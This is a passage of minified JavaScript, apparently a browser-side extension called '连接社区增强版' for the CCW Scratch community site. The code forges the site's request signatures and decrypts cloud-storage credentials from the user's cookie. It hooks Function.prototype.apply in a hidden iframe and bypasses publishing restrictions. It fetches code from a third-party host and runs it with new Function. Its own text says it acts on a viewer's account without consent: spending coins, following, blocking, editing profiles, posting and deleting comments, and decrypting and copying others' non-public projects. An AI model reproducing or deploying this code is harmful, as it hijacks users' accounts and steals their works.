                    e ^= k[o / n | 0] << 24),
                    i[o] = i[o - n] ^ e);
                for (t = this._invKeySchedule = [],
                n = 0; n < r; n++)
                    o = r - n,
                    e = n % 4 ? i[o] : i[o - 4],
                    t[n] = n < 4 || o <= 4 ? e : u[s[e >>> 24]] ^ l[s[e >>> 16 & 255]] ^ d[s[e >>> 8 & 255]] ^ h[s[255 & e]]
            },
            encryptBlock: function(e, t) {
                this._doCryptBlock(e, t, this._keySchedule, i, o, c, a, s)
            },
            decryptBlock: function(e, t) {
                var n = e[t + 1];
                e[t + 1] = e[t + 3],
                e[t + 3] = n,
                this._doCryptBlock(e, t, this._invKeySchedule, u, l, d, h, r),
                n = e[t + 1],
                e[t + 1] = e[t + 3],
                e[t + 3] = n
            },
            _doCryptBlock: function(e, t, n, r, i, o, s, c) {
                for (var a = this._nRounds, u = e[t] ^ n[0], l = e[t + 1] ^ n[1], d = e[t + 2] ^ n[2], h = e[t + 3] ^ n[3], p = 4, f = 1; f < a; f++)
                    var y = r[u >>> 24] ^ i[l >>> 16 & 255] ^ o[d >>> 8 & 255] ^ s[255 & h] ^ n[p++]
                      , m = r[l >>> 24] ^ i[d >>> 16 & 255] ^ o[h >>> 8 & 255] ^ s[255 & u] ^ n[p++]
                      , g = r[d >>> 24] ^ i[h >>> 16 & 255] ^ o[u >>> 8 & 255] ^ s[255 & l] ^ n[p++]
                      , h = r[h >>> 24] ^ i[u >>> 16 & 255] ^ o[l >>> 8 & 255] ^ s[255 & d] ^ n[p++]
                      , u = y
                      , l = m
                      , d = g;
                y = (c[u >>> 24] << 24 | c[l >>> 16 & 255] << 16 | c[d >>> 8 & 255] << 8 | c[255 & h]) ^ n[p++],
                m = (c[l >>> 24] << 24 | c[d >>> 16 & 255] << 16 | c[h >>> 8 & 255] << 8 | c[255 & u]) ^ n[p++],
                g = (c[d >>> 24] << 24 | c[h >>> 16 & 255] << 16 | c[u >>> 8 & 255] << 8 | c[255 & l]) ^ n[p++],
                h = (c[h >>> 24] << 24 | c[u >>> 16 & 255] << 16 | c[l >>> 8 & 255] << 8 | c[255 & d]) ^ n[p++],
                e[t] = y,
                e[t + 1] = m,
                e[t + 2] = g,
                e[t + 3] = h
            },
            keySize: 8
        });
        e.AES = t._createHelper(n)
    }
    )();
    var me = F("https://community-web.ccw.site/health/check").then(e=>e.json()).then(e=>e.body).then(e=>(me.done = 1,
    e.map(({traceId: e})=>e[parseInt(e[0], 16) + 1]).reverse().join("")));
    async function z(e, t, n="post") {
        var t = JSON.stringify(t)
          , r = Date.now()
          , i = P.HmacMD5("ccw" + t + r, await me).toString(P.enc.Hex);
        return fetch(e, {
            method: n,
            body: t,
            headers: {
                a: i,
                b: r,
                "content-type": "application/json"
            },
            credentials: "include"
        }).then(e=>e.json()).then(e=>{
            if (200 == e.status)
                return e.body;
            throw e
        }
        )
    }
    var Te, Ce, Le, re, Ne = ot(Ie());
    function st(e) {
        return ("; " + document.cookie).split(`; ${e}=`).pop().split(";").shift()
    }
    async function Re() {
        var e = await F("https://community-web.ccw.site/ccw-main/status").then(e=>e.json()).then(e=>e.body.data)
          , t = st("cookie-user-id");
        return JSON.parse(P.AES.decrypt(e, P.enc.Utf8.parse(t.slice(t.length - 16)), {
            iv: P.enc.Utf8.parse(t.slice(0, 16))
        }).toString(P.enc.Utf8))
    }
    function Ue(e, t) {
        var t = P.enc.Base64.parse("KzdnFCBRvq3" + t)
          , n = (t.sigBytes = 32,
        t.clone())
          , e = (n.sigBytes = 16,
        n.words.splice(4),
        P.AES.decrypt(e, t, {
            iv: n,
            mode: P.mode.CBC,
            padding: P.pad.Pkcs7
        }));
        return P.enc.Utf8.stringify(e)
    }
    async function we(e, t=fetch(e)) {
        var n = new URL(e).pathname
          , n = n.split("/").pop().split(".").shift()
          , t = new Uint8Array(Ue(await (await t).text(), n).split(","));
        return new Blob([t])
    }
    function G(e, t={}, n="") {
        let r = document.createElement(e);
        return Object.keys(t).forEach(e=>r.setAttribute(e, t[e])),
        n && (r.textContent = n),
        r
    }
    Re().then(e=>{
        ({accessKeyId: Te, accessKeySecret: Ce, securityToken: Le} = e),
        re = new Ne.default({
            accessKeyId: Te,
            accessKeySecret: Ce,
            stsToken: Le,
            bucket: "zhishi",
            region: "oss-cn-beijing",
            secure: !0
        })
    }
    );
    var be, ae = class {
        constructor(e, t={}) {
            this.treeData = e,
            this.options = {
                title: "Tree Dialog",
                width: "400px",
                ...t
            },
            this.initDialog(),
            this.renderTree(),
            this.setupEvents()
        }
        initDialog() {
            this.overlay = G("div", {
                class: "dialog-overlay",
                style: "display: none;"
            }),
            this.dialog = G("div", {
                class: "dialog-container"
            });
            var e = G("div", {
                class: "dialog-header"
            })
              , t = (e.appendChild(G("h3", {}, this.options.title)),
            this.closeBtn = G("button", {
                class: "close-button"
            }, "×"),
            e.appendChild(this.closeBtn),
            G("div", {
                class: "dialog-content"
            }));
            this.treeRoot = G("ul", {
                class: "tree",
                id: "treeRoot"
            }),
            t.appendChild(this.treeRoot),
            this.dialog.appendChild(e),
            this.dialog.appendChild(t),
            this.overlay.appendChild(this.dialog),
            document.body.appendChild(this.overlay)
        }
        renderTree(s=this.treeRoot, e=this.treeData) {
            e.forEach(e=>{
                let t = G("li", {
                    class: "tree-node"
                })
                  , n = G("div", {
                    class: "tree-node-header"
                })
                  , r = G("span", {
                    class: "tree-node-icon"
                })
                  , i = G("span", {}, e.name);
                var o;
                n.appendChild(r),
                n.appendChild(i),
                t.appendChild(n),
                e.children && 0 < e.children.length ? (r.textContent = "▶",
                t.classList.add("collapsed"),
                o = G("ul", {
                    class: "tree-children"
                }),
                this.renderTree(o, e.children),
                t.appendChild(o),
                n.addEventListener("click", ()=>{
                    t.classList.toggle("expanded"),
                    t.classList.toggle("collapsed"),
                    r.textContent = t.classList.contains("expanded") ? "▼" : "▶"
                }
                )) : r.textContent = "•",
                s.appendChild(t)
            }
            )
        }
        setupEvents() {
            this.closeBtn.addEventListener("click", ()=>this.hide()),
            this.overlay.addEventListener("click", e=>{
                e.target === this.overlay && this.hide()
            }
            )
        }
        show() {
            this.overlay.style.display = "flex"
        }
        hide() {
            this.overlay.style.display = "none"
        }
    }
    , ze = document.createElement("style");
    async function ct(e, t) {
        var n = runtime.extensionManager;
        if (runtime.__fuckPublicationRestrictions)
            return r('console.log("__fuckPublicationRestrictions","已阻止热重载")'),
            !1;
        (location.href.includes("gandi") || location.href.includes("creator")) && (runtime.__fuckPublicationRestrictions = !0,
        console.log("连接社区增强版正在加载到官方社区连接")),
        window._communityEnhanced_install_to_community_ = 1,
        await n.loadExtensionURL(e),
        runtime.requestBlocksUpdate(),
        runtime.__fuckPublicationRestrictions = !0
    }
    function Pe(e, t) {
        e = `(${ct})(${JSON.stringify(e)},${JSON.stringify(t)})`;
        return console.log(e),
        e
    }
    function ue(e) {
        if (be.blocks.createBlock(e))
            return be.blocks.getBlock(e.id)
    }
    function at(e) {
        ue({
            id: "communityEnhanced:input0",
            opcode: "math_number",
            inputs: {},
            fields: {
                NUM: {
                    name: "NUM",
                    value: "连接社区增强版"
                }
            },
            next: null,
            topLevel: !1,
            parent: "communityEnhanced:hat",
            shadow: !0,
            hidden: !1,
            locked: !1,
            collapsed: !1
        }),
        ue({
            id: "communityEnhanced:code",
            opcode: "text",
            inputs: {},
            fields: {
                TEXT: {
                    name: "TEXT",
                    value: e
                }
            },
            next: null,
            topLevel: !1,
            parent: "communityEnhanced:js",
            shadow: !0,
            hidden: !1,
            locked: !1,
            collapsed: !1
        }),
        ue({
            id: "communityEnhanced:js",
            opcode: "WitCatHTML_jsfunc",
            inputs: {
                js: {
                    name: "js",
                    block: "communityEnhanced:code",
                    shadow: "communityEnhanced:code"
                }
            },
            fields: {},
            next: null,
            topLevel: !1,
            parent: "communityEnhanced:hat",
            shadow: !1,
            hidden: !1,
            locked: !1,
            collapsed: !1,
            x: null,
            y: null,
            mutation: {
                tagName: "mutation",
                children: [],
                dynamicargids: "[]",
                dynamicargtypes: "[]"
            }
        }),
        ue({
            id: "communityEnhanced:hat",
            opcode: "event_whengreaterthan",
            inputs: {
                VALUE: {
                    name: "VALUE",
                    block: "communityEnhanced:input0",
                    shadow: "communityEnhanced:input0"
                }
            },
            fields: {
                WHENGREATERTHANMENU: {
                    name: "WHENGREATERTHANMENU",
                    value: "TIMER"
                }
            },
            next: "communityEnhanced:js",
            topLevel: !0,
            parent: null,
            shadow: !1,
            hidden: !1,
            locked: !1,
            collapsed: !1,
            x: null,
            y: null
        })
    }
    async function De(e, t) {
        var e = e.runtime
          , n = e.extensionManager;
        be = e.getTargetForStage();
        let r = "u" < typeof extid ? "communityEnhanced" : extid
          , i = 0;
        return e.__fuckPublicationRestrictions || (at(await Pe(t, r)),
        i += 1),
        null != (t = n._customExtensionInfo) && t.WitCatHTML || (await n.loadExtensionURL("WitCatHTML"),
        i += 2),
        Ae(r, "community_", e),
        console.log("绕过禁止发布", i),
        i
    }
    function He() {
        return new Promise((t,e)=>{
            let n = document.createElement("iframe");
            n.style.display = "none",
            n.addEventListener("load", function() {
                var e = n.contentWindow;
                e.resolve = t,
                e.eval('const _apply=Function.prototype.apply;Object.defineProperty(Function.prototype,"apply",{value:function(thisArg,args){if(typeof thisArg==="object"&&thisArg&&thisArg.defaults&&thisArg.interceptors&&thisArg.interceptors.request.handlers.length>0){this.apply=_apply;resolve(thisArg)}return _apply.call(this,thisArg,args)},writable:false,enumerable:true,configurable:true})')
            }),
            n.addEventListener("error", e),
            n.src = "https://ccw.site/404",
            document.body.appendChild(n)
        }
        )
    }
    ze.textContent = `
.dialog-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.5);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 1000;
}

.dialog-container {
    background-color: white;
    border-radius: 8px;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    width: 75%;
    max-height: 80vh;
    overflow: auto;
    position: relative;
}

.dialog-header {
    padding: 16px;
    border-bottom: 1px solid #eee;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.close-button {
    background: none;
    border: none;
    font-size: 20px;
    cursor: pointer;
    color: #999;
}

.close-button:hover {
    color: #333;
}

.dialog-content {
    padding: 16px;
}

.tree {
    list-style-type: none;
    padding-left: 20px;
}

.tree-node {
    margin: 8px 0;
}

.tree-node-header {
    cursor: pointer;
    display: flex;
    align-items: center;
}

.tree-node-icon {
    margin-right: 8px;
    font-size: 14px;
    width: 16px;
    text-align: center;
}

.tree-children {
    list-style-type: none;
    padding-left: 20px;
    display: none;
}

.tree-node.expanded > .tree-children {
    display: block;
}
`,
    document.head.appendChild(ze);
    var X, ie, Ke, Fe, ut = "https://ccwextensions.431658.dpdns.org/", lt = Scratch.Cast, W = (null == (Ke = Scratch.vm) ? void 0 : Ke.runtime) ?? Scratch.runtime, ve = W.extensionManager.vm, dt = window.ScratchBlocks ?? W.scratchBlocks ?? getBlockly(ve);
    async function ft() {
        if (X)
            return window._communityEnhanced_install_to_community_ && confirm("侧载模式下需要先恢复独立扩展安装再更新，是否查看还原教程？") && ne("https://www.kdocs.cn/l/cgemTuG6bHYl?linkname=OGjoraKuFI"),
            prompt(`即将开始更新，更新后保存作品并刷新页面生效。
如果是协作作品可能暂时无法直接更新，请卸载扩展再安装。
最新版扩展url：`, X),
            W.extensionManager.loadExtensionURL(X)
    }
    var Je = "u" < typeof extid ? "communityEnhanced" : extid;
    async function ht() {
        return z("https://community-web.ccw.site/students/self/detail", {
            needGrade: !0,
            needExtraInfo: !0,
            fields: []
        }).then(e=>e.studentNumber)
    }
    var xe = ()=>({
        id: Je,
        name: window._communityEnhanced_install_to_community_ ? "连接社区增强版【侧载模式】" : "连接社区增强版",
        color1: "#0FBD8C",
        docs: !0,
        docsURI: "https://www.kdocs.cn/l/cgemTuG6bHYl",
        icon: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTI5IiBoZWlnaHQ9IjEyOSIgdmlld0JveD0iMCAwIDEyOSAxMjkiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHg9IjM3IiB5PSI0MCIgd2lkdGg9IjUyIiBoZWlnaHQ9IjUyIiBzdHJva2U9ImJsYWNrIiBzdHJva2Utd2lkdGg9IjYiLz4KPHJlY3QgeD0iMjQuNSIgeT0iMjcuNSIgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiByeD0iMy41IiBmaWxsPSIjRkFGRjAwIiBzdHJva2U9ImJsYWNrIiBzdHJva2Utd2lkdGg9IjMiLz4KPHJlY3QgeD0iMjQuNSIgeT0iNzkuNSIgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiByeD0iMy41IiBmaWxsPSIjNzFFQTM5IiBzdHJva2U9ImJsYWNrIiBzdHJva2Utd2lkdGg9IjMiLz4KPHJlY3QgeD0iNzYuNSIgeT0iMjcuNSIgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiByeD0iMy41IiBmaWxsPSIjRkY0OTRCIiBzdHJva2U9ImJsYWNrIiBzdHJva2Utd2lkdGg9IjMiLz4KPHJlY3QgeD0iNzYuNSIgeT0iNzkuNSIgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiByeD0iMy41IiBmaWxsPSIjNzVENkZEIiBzdHJva2U9ImJsYWNrIiBzdHJva2Utd2lkdGg9IjMiLz4KPC9zdmc+Cg==",
        init() {
            window._communityEnhanced && setTimeout(()=>{
                alert(`已更新${window._communityEnhanced}>${window.communityEnhanced}，保存作品并刷新页面生效。
如果是协作作品可能暂时无法直接更新，请卸载扩展再安装。`)
            }
            , 1e3),
            W.startHats("event_whenbroadcastreceived", {
                BROADCAST_OPTION: "communityEnhanced_Loaded"
            })
        },
        blocks_parse_mode: 2,
        blocks: [["cannot_publish", "t", "无法发布作品怎么办", , function() {
            alert("你没有看扩展文档，看文档去吧！"),
            ne("https://www.kdocs.cn/l/cgemTuG6bHYl?linkname=DoLDCn65li")
        }
        , {}], ["---", , , , , {
            doNotParse: !0
        }], ["checkupdate", "t", "检测更新", , async function() {
            try {
                ie && (ie = null,
                W.emit("TOOLBOX_EXTENSIONS_NEED_UPDATE")),
                X = await fetch(ut + "communityEnhanced/latestURL.txt").then(e=>e.text());
                var e = await fetch(X).then(e=>e.text())
                  , t = new Function("window",e.substring(0, e.indexOf(`
`)))
                  , n = {};
                if (t(n),
                !(ie = n.communityEnhanced))
                    throw "版本信息为空";
                W.emit("TOOLBOX_EXTENSIONS_NEED_UPDATE")
            } catch (e) {
                alert("获取版本信息失败：" + e),
                ie = null,
                W.emit("TOOLBOX_EXTENSIONS_NEED_UPDATE")
            }
        }
        , {}], $("已安装版本"), $(window.communityEnhanced), $("最新版本"), $(ie ?? "-"), ["install", "t", "更新", , ft, {
            hideFromPalette: !X
        }], ["copylatestcode", "t", "复制最新代码", , async function() {
            X || await this.checkupdate();
            var e = G("input", {
                type: "text",
                value: await fetch(X).then(e=>e.text())
            });
            document.body.appendChild(e),
            e.select(),
            document.execCommand("copy"),
            document.body.removeChild(e),
            alert("已复制最新代码")
        }
        , {}], ["---", , , , , {
            doNotParse: !0
        }], ["loadcommunity", "t", "安装官方社区连接扩展", , function() {
            W.extensionManager.loadExtensionURL("community")
        }
        , {}], ["loadcommunitypro", "t", "安装连接社区+扩展", , function() {
            W.extensionManager.loadExtensionURL("https://cp.zeroink.dpdns.org/loader.js")
        }
        , {}], ["getuseroid", "r", "获取用户oid(唯一id)", {}, function() {
            return te("cookie-user-id")
        }
        , [!0]], ["getprojectid", "r", "获取作品id", {}, function() {
            var e = location.pathname.split("/").pop();
            return "gandi" === e || "extension" === e ? "" : e
        }
        , [!0]], ["coins", "b", "投币[bucks]作品id[objectId]", {
            bucks: ["n", "10", , 1],
            objectId: ["s", "", , 1]
        }, async function({bucks: e, objectId: t}) {
            return F("https://community-web.ccw.site/study-trade/trade/donate", JSON.stringify({
                bucks: e,
                objectId: t,
                objectType: "CREATION"
            })).then(e=>e.json()).then(e=>200 == e.status).catch(e=>!1)
        }
        , {}], ["getCoin", "r", "获取用户金币数量", {}, function() {
            return F("https://community-web.ccw.site/currency/account/personal").then(e=>e.json()).then(e=>e.body.internalCurrencyBalance).catch(e=>null)
        }
        , [!0]], ["follow", "b", "[type]用户oid[followingOid]", {
            followingOid: ["s", "6640a08e7f75c17722e1485a", , 1],
            type: ["s", "follow", "followApi", 1]
        }, async function({type: e, followingOid: t}) {
            return F("https://community-web.ccw.site/study-community/following/" + e, JSON.stringify({
                followingOid: t
            })).then(e=>e.json()).then(e=>200 == e.status).catch(e=>!1)
        }
        , {}], ["block", "b", "[type]用户oid[studentOid]", {
            studentOid: ["s", "", , 1],
            type: ["s", "create", "blockApi", 1]
        }, async function({type: e, studentOid: t}) {
            return z("https://community-web.ccw.site/student/block_record/" + e, {
                studentOid: t
            }).catch(e=>(console.error(e),
            !1))
        }
        , {}], ["changeuserinfo", "b", "修改用户信息[key]为[value]", {
            key: ["s", "bio", "profile"],
            value: ["s", "无"]
        }, async function({key: e, value: t}) {
            return z("https://community-web.ccw.site/students/update", {
                [e]: t
            }).catch(()=>!1)
        }
        , [!0]], ["hashtag", "b", "[type]星球[idorname][text]", {
            type: ["s", "favorite", "favorite"],
            idorname: ["s", "name", "idorname"],
            text: ["s", "连接社区增强版"]
        }, async function({type: e, idorname: t, text: n}) {
            try {
                return await z("https://community-web.ccw.site/hash_tag_favorite/" + e, {
                    hashTagId: "name" == t ? (await F("https://community-web.ccw.site/hash_tag/detail", JSON.stringify({
                        identifier: n
                    })).then(e=>e.json()).then(e=>e.body)).id : Number(n)
                }).catch(()=>!1)
            } catch (e) {
                return console.error(e),
                !1
            }
        }
        , {}], ["gethashtagmembers", "r", "获取星球[idorname]为[text]的成员", {
            idorname: ["s", "name", "idorname"],
            text: ["s", "连接社区增强版"]
        }, async function({idorname: e, text: t}) {
            return F("https://community-web.ccw.site/hash_tag/detail", JSON.stringify("name" == e ? {
                identifier: t
            } : {
                id: Number(t)
            })).then(e=>e.json()).then(e=>JSON.stringify((null == (e = e.body) ? void 0 : e.latestFavoritedStudents) ?? null)).catch(()=>null)
        }
        , [!0]], $("评论"), ["createcomment", "r", "在[subjectType][subjectOid]发布[sectionType]内容[content]被回复评论(如果有)[replyToId]", {
            subjectType: ["s", "PROFILE", "subjectType"],
            subjectOid: ["s", "61039f14fffbe5461b880787"],
            sectionType: ["s", "COMMENT", "sectionType"],
            content: ["s", "连接社区增强版是ccw最好的扩展！没有之一！"],
            replyToId: ["s"]
        }, async function({subjectType: e, subjectOid: t, sectionType: n, content: r, replyToId: i}) {
            return z("https://community-web.ccw.site/comment/create", {
                content: r,
                topic: {
                    outline: "\0",
                    subjectType: e,
                    subjectOid: t,
                    ext: "EXTENSION" == e ? {
                        target: 0
                    } : void 0
                },
                sectionType: n,
                replyToId: i ||= void 0
            }).then(e=>(null == e ? void 0 : e.id) ?? 0).catch(()=>0)
        }
        , [!0]], ["replycomment", "r", "回复评论id[replyToId]内容[content]", {
            content: ["s", "连接社区增强版是ccw最好的扩展！没有之一！"],
            replyToId: ["s", "9204314"]
        }, async function({content: e, replyToId: t}) {
            return z("https://community-web.ccw.site/comment/reply", {
                content: e,
                replyToId: t
            }).then(e=>(null == e ? void 0 : e.id) ?? 0).catch(()=>0)
        }
        , [!0]], ["getcomment", "r", "获取[subjectType][subjectOid]的所有[sectionType]被回复评论(如果有)[parentId]，每页数量（≤1000）[perPage]页码[page]", {
            subjectType: ["s", "PROFILE", "subjectType"],
            subjectOid: ["s", "6640a08e7f75c17722e1485a"],
            sectionType: ["s", "COMMENT", "sectionType"],
            parentId: ["n", 0, , 1],
            perPage: ["n", 100],
            page: ["n", 1]
        }, function({subjectType: e, subjectOid: t, sectionType: n, perPage: r, page: i, parentId: o}) {
            return o ||= null,
            fetch(`https://community-web.ccw.site/comment/page_by_topic?offset=0&page=${i}&perPage=${r}&sortField=createdAt&sortType=DESC`, {
                method: "POST",
                body: JSON.stringify({
                    subjectType: e,
                    subjectOid: t,
                    sectionType: n,
                    parentId: o
                }),
                headers: {
                    "content-type": "application/json"
                }
            }).then(e=>e.json()).then(JSON.stringify).catch(()=>null)
        }
        , [!0]], ["deletecomment", "b", "删除评论id[id]", {
            id: ["s"]
        }, function({id: e}) {
            return F("https://community-web.ccw.site/study-community/comment/delete", JSON.stringify({
                id: e
            })).then(e=>e.json()).then(e=>e.body).catch(()=>!1)
        }
        , {
            hideFromPalette: !0
        }], ["operationcomment", "b", "[operation]评论id[id]", {
            id: ["s"],
            operation: ["s", "delete", "commentoperation"]
        }, function({id: e, operation: t}) {
            return F("https://community-web.ccw.site/study-community/comment/" + t, JSON.stringify({
                id: e
            })).then(e=>e.json()).then(e=>e.body).catch(()=>!1)
        }
        , {}], $("经济合约"), ["contractcoins", "b", "经济合约注/取币[bucks]作品id[bizId]合约id[id]合约规则id[ruleId]", {
            bucks: ["n", "10", , 1],
            bizId: ["s", "", , 1],
            id: ["s"],
            ruleId: ["s", "", , 1]
        }, async function({bucks: e, bizId: t, id: n, ruleId: r}) {
            return z("https://community-web.ccw.site/smart_contract/execute", {
                params: {
                    bucks: e
                },
                bizId: t,
                id: n,
                ruleId: r,
                objectType: "CREATION"
            }).catch(()=>!1)
        }
        , {}], ["contractinvest", "b", "经济合约注币[bucks]合约id[id]", {
            bucks: ["n", "10", , 1],
            id: ["s"]
        }, async function({bucks: e, id: t}) {
            return z("https://community-web.ccw.site/smart_contract/invest", {
                id: t,
                bucks: e
            }).catch(()=>!1)
        }
        , {}], ["contractlist", "r", "获取作品id[bizId]的所有合约", {
            bizId: ["s", "", , 1]
        }, async function({bizId: e}) {
            return z("https://community-web.ccw.site/smart_contract/list", {
                bizId: e,
                objectType: "CREATION"
            }).catch(()=>null)
        }
        , {}], $("作品推广"), ["sharetofeed", "b", "分享作品id[creationOid]到动态", {
            creationOid: ["s", ""]
        }, async function({creationOid: e}) {
            return z("https://community-web.ccw.site/feed/creation_share", {
                creationOid: e
            }).catch(()=>!1)
        }
        , {}], ["getfriends", "r", "获取用户oid[studentOid]的所有互关好友，每页数量（≤1000）[perPage]页码[page]", {
            studentOid: ["s", "6640a08e7f75c17722e1485a"],
            perPage: ["n", 100],
            page: ["n", 1]
        }, function({studentOid: e, perPage: t, page: n}) {
            return fetch(`https://community-web.ccw.site/student/following/page?page=${n}&perPage=${t}&sortType=DESC`, {
                method: "POST",
                body: JSON.stringify({
                    studentOid: e,
                    page: n,
                    perPage: t,
                    statuses: ["BOTH_FOLLOWED"]
                }),
                headers: {
                    "content-type": "application/json"
                }
            }).then(e=>e.json()).then(e=>JSON.stringify(e.body.data.map(e=>e.followingOid))).catch(()=>null)
        }
        , [!0]], ["sharetofriend", "b", "分享作品id[creationOid]给互关好友oid[receiverOid]", {
            creationOid: ["s"],
            receiverOid: ["s"]
        }, async function({creationOid: e, receiverOid: t}) {
            return z("https://community-web.ccw.site/notification/creation_share", {
                creationOid: e,
                receiverOid: t
            }).catch(()=>!1)
        }
        , {}], ["like", "b", "用图标[action]给作品id[oid]点赞", {
            action: ["s", "LIKE", "likeactions"],
            oid: ["s", "", , 1]
        }, async function({action: e, oid: t}) {
            return F("https://community-web.ccw.site/creation_stats/like", JSON.stringify({
                action: e,
                oid: t
            })).then(e=>e.json()).then(e=>200 == e.status).catch(e=>!1)
        }
        , {}], ["like2", "b", "给[subjectType][id][likeType]", {
            subjectType: ["s", "extension", "likeSubjectType"],
            id: ["s", "mdui"],
            likeType: ["s", "like", "likeType"]
        }, function({subjectType: e, id: t, likeType: n}) {
            switch (e) {
            case "post":
                return "unlike" != n && z("https://community-web.ccw.site/post/like", {
                    relatedEntityId: t
                }).catch(e=>!1);
            case "extension":
                return z(`https://bfs-web.ccw.site/extensions/${t}/like`, {}, "unlike" == n ? "DELETE" : "POST").catch(e=>!1)
            }
        }
        ], ["project", "r", "发布作品id[oid](仅自己的作品)，作品名[title]星球(可不填)[hashTags]封面(可不填)[coverLink]开源等级[sourceOpenLevel]", {
            oid: ["s"],
            title: ["s", "我的作品"],
            hashTags: ["s", JSON.stringify(["反ccw", "乐子ccw", "死人鸭鸭", "CSense", "违规扩展"])],
            coverLink: ["s"],
            sourceOpenLevel: ["s", "PUBLIC", "sourceOpenLevel"]
        }, async function({oid: e, title: t, hashTags: n, coverLink: r, sourceOpenLevel: i}) {
            try {
                if ("" == n)
                    n = [];
                else
                    try {
                        if (n = JSON.parse(n),
                        !Array.isArray(n))
                            throw "not array"
                    } catch {}
                var o = (await F("https://community-web.ccw.site/creation/detail", JSON.stringify({
                    oid: e
                })).then(e=>e.json()).then(e=>e.body)).latestProjectLink;
                if (o)
                    return await z("https://community-web.ccw.site/creation/submit", {
                        tags: [],
                        title: t,
                        isOpenSource: !0,
                        isContribute: !0,
                        type: "ORIGINAL",
                        publishedFeedSwitch: !0,
                        keyboardLayout: "TOUCH",
                        hashTags: n,
                        featuredCoverLink: "",
                        sourceOpenLevel: i,
                        requireLogin: !1,
                        operatingInstruction: null,
                        description: null,
                        releaseDescription: null,
                        videoLink: null,
                        releaseTags: [],
                        customVersion: "1.0.0",
                        repostedSource: "",
                        coverLink: r,
                        projectLink: o,
                        remixCreationOid: null,
                        oid: e,
                        hasCloudVariables: !1,
                        extensions: [],
                        projectSize: 114514,
                        audioSize: 114514,
                        costumeSize: 114514
                    }) ? e : "";
                throw "获取作品信息url为空"
            } catch (e) {
                return console.error(e),
                ""
            }
        }
        , {}], ["updateproject", "r", "更新作品id[oid](仅自己的作品)，作品名[title]星球(可不填)[hashTags]封面(可不填)[coverLink]开源等级[sourceOpenLevel]", {
            oid: ["s"],
            title: ["s", "我的作品"],
            hashTags: ["s", JSON.stringify(["反ccw", "乐子ccw", "死人鸭鸭", "CSense", "违规扩展"])],
            coverLink: ["s"],
            sourceOpenLevel: ["s", "PUBLIC", "sourceOpenLevel"]
        }, async function({oid: e, title: t, hashTags: n, coverLink: r, sourceOpenLevel: i}) {
            try {
                if ("" == n)
                    n = [];
                else
                    try {
                        if (n = JSON.parse(n),
                        !Array.isArray(n))
                            throw "not array"
                    } catch {}
                var o = (await F("https://community-web.ccw.site/creation/detail", JSON.stringify({
                    oid: e
                })).then(e=>e.json()).then(e=>e.body)).latestProjectLink;
                if (o)
                    return await z("https://community-web.ccw.site/creation/update", {
                        tags: [],
                        title: t,
                        isOpenSource: !0,
                        isContribute: !0,
                        type: "ORIGINAL",
                        publishedFeedSwitch: !0,
                        keyboardLayout: "TOUCH",
                        hashTags: n,
                        featuredCoverLink: "",
                        sourceOpenLevel: i,
                        requireLogin: !1,
                        operatingInstruction: null,
                        description: null,
                        releaseDescription: null,
                        videoLink: null,
                        releaseTags: [],
                        customVersion: "1.0.0",
                        repostedSource: "",
                        coverLink: r,
                        projectLink: o,
                        remixCreationOid: null,
                        oid: e,
                        hasCloudVariables: !1,
                        extensions: [],
                        projectSize: 114514,
                        audioSize: 114514,
                        costumeSize: 114514
                    }) ? e : "";
                throw "获取作品信息url为空"
            } catch (e) {
                return console.error(e),
                ""
            }
        }
        , {}], ["remixproject", "r", "改编作品id[oid]为私有作品[decrypt]，作品名[title]封面(可不填)[coverLink]", {
            oid: ["s"],
            title: ["s", "我的作品"],
            coverLink: ["s"],
            decrypt: ["s", "auto", "isDecrypt"]
        }, async function({oid: e, title: t, coverLink: n, decrypt: r="auto"}) {
            try {
                var i, o, s, {latestProjectLink: c, sourceOpenLevel: a} = await F("https://community-web.ccw.site/creation/detail", JSON.stringify({
                    oid: e,
                    mode: r ? void 0 : "REMIX"
                })).then(e=>e.json()).then(e=>e.body);
                if (c)
                    return i = await fetch(c),
                    o = (r = "auto" == r ? "PUBLIC" != a : lt.toBoolean(r)) ? await we(c, i) : await i.blob(),
                    s = `user_projects_sb3/${await ht()}/${ye()}.sb3`,
                    await re.put(s, o),
                    await z("https://community-web.ccw.site/creation/create", {
                        type: "ORIGINAL",
                        title: t,
                        latestProjectLink: String(new URL(s,"https://m.ccw.site/")),
                        screenMode: "LANDSCAPE",
                        artifactType: "STANDARD",
                        sourceOpenLevel: "PRIVATE",
                        latestCoverLink: n
                    }).then(e=>e.oid);
                throw "获取作品信息url为空"
            } catch (e) {
                return "error: " + e.msg
            }
        }
        , {
            allowDropAnywhere: !0
        }], ["publish_ext", "r", "一键发布扩展[url]到素材集市，扩展id(eid)[eid]名字[name]介绍[description]必读文档(可不填)[readme]封面[cover]积木浏览(可不填)[preview]", {
            eid: ["s", extid],
            name: ["s", "连接社区增强版"],
            cover: ["s", "https://m.ccw.site/works-covers/f81d66a7-b7aa-473f-a476-2e2d3f88af81.png"],
            description: ["s", "无需用户同意就可以：投币、点赞、关注、拉黑、经济合约注币、分享作品、发评论、删除评论、修改个人信息……"],
            url: ["s", "https://ccwextensions.431658.dpdns.org/communityEnhanced/latestURL.txt", "exturl"],
            readme: ["s", "本扩展由[连接社区增强版](https://www.kdocs.cn/l/cgemTuG6bHYl)的“一键发布扩展”功能发布"],
            preview: ["s"]
        }, async function({url: i, eid: o, name: s, cover: c, description: a, projectLink: u, preview: l, readme: d, changelog: h}) {
            var e;
